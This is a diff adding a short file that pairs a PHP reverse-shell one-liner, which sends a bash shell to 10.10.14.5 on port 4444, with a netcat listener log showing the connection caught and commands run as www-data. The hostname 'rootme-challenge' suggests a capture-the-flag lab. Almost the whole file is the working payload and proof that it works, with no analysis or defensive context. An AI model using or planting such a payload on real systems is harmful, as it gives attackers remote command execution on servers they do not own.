@@ -1,0 +1,15 @@
+# Reverse Shell via PHP
+<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"); ?>
+
+# Terminal Log
+$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.10.2
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+whoami
+www-data
+
+hostname
+rootme-challenge
